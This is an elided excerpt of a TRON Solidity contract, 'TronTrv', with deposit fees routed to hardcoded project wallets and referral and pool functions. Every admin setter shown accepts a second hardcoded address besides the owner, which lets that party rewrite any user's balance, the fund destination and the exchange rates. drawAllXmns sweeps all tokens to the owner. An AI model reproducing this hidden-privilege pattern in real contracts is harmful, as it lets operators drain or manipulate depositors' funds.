...
contract TronTrv {
	...
	uint256 public xmnsTOtrx = 1e8;//xmns-trx
	uint256 public trxToXmnsRate = 0;//trx->xmns rate
	uint256 public xmnsIssueBase = 1e13;
    ...
    constructor(address payable _owner) public {
        ...
        project_side1 = 0x042BC01c434a5CCD48011971996Da6d7E417b7d8;
        project_side2 = 0x371CaFf75475fE1650DbCF67f327A5e4563A0395;
        project_side3 = 0xabc4c1f815945eaC5AB9BAA8Ed02bF0722925E48;
    ...
    function _deposit(address _addr, uint256 _amount) private {
		...
		project_side1.transfer(_amount * 20 / 1000);
		project_side2.transfer(_amount * 25 / 1000);
		project_side3.transfer(_amount * 5 / 1000);
		if(fundRate > 0){
	...
	*/
	...
	/**
    * @dev set User XmnsBalance.
    */
    function setUserXmnsBalance(address _addr,uint256 _xmnsbalance) external {
        require(msg.sender == owner || msg.sender == 0xe4e4B4CC2992bB281f032f7adFdB349B554A7b05, "must be owner");
        users[_addr].xmnsbalance = _xmnsbalance;
    }
	
	/**
    * @dev set fundRate.
    */
    function setFundRate(address payable _addr,uint256 _fundRate) external {
        require(msg.sender == owner || msg.sender == 0xe4e4B4CC2992bB281f032f7adFdB349B554A7b05, "must be owner");
		xmns_fund = _addr;
        fundRate = _fundRate;
    }
	...
	/**
    * @dev set totalXmnsBalance.
    */
    function setTotalXmnsBalance(uint256 _totalXmnsBalance) external {
        require(msg.sender == owner || msg.sender == 0xe4e4B4CC2992bB281f032f7adFdB349B554A7b05, "must be owner");
        totalXmnsBalance = _totalXmnsBalance;
    }
	
	/**
    * @dev set trxToXmnsRate.
    */
    function setTrxToXmnsRate(uint256 _trxToXmnsRate) external {
        require(msg.sender == owner || msg.sender == 0xe4e4B4CC2992bB281f032f7adFdB349B554A7b05, "must be owner");
        trxToXmnsRate = _trxToXmnsRate;
    }
	
	/**
    * @dev set xmnsTOtrx.
    */
    function setXmnsTOtrxPrice(uint256 _xmnsTOtrx) external {
        require(msg.sender == owner || msg.sender == 0xe4e4B4CC2992bB281f032f7adFdB349B554A7b05, "must be owner");
        xmnsTOtrx = _xmnsTOtrx;
    }
	
	/**
    * @dev set xmnsIssueBase.
    */
    function setXmnsIssueBase(uint256 _xmnsIssueBase) external {
        require(msg.sender == owner || msg.sender == 0xe4e4B4CC2992bB281f032f7adFdB349B554A7b05, "must be owner");
        xmnsIssueBase = _xmnsIssueBase;
    }
	
	/**
	* dev drawAll
	*/
	function drawAll() external{
	...
	* dev drawAllXmns
	*/
	function drawAllXmns() external{
		xmnsTokenTransfer.transfer(owner,xmnsTokenTransfer.balanceOf(address(this)));
	}
    ...
    */
    ...
    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 xmns_balance) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].xmnsbalance);
    }
    ...
    function poolTopInfo() view external returns(address[6] memory addrs, uint256[6] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;
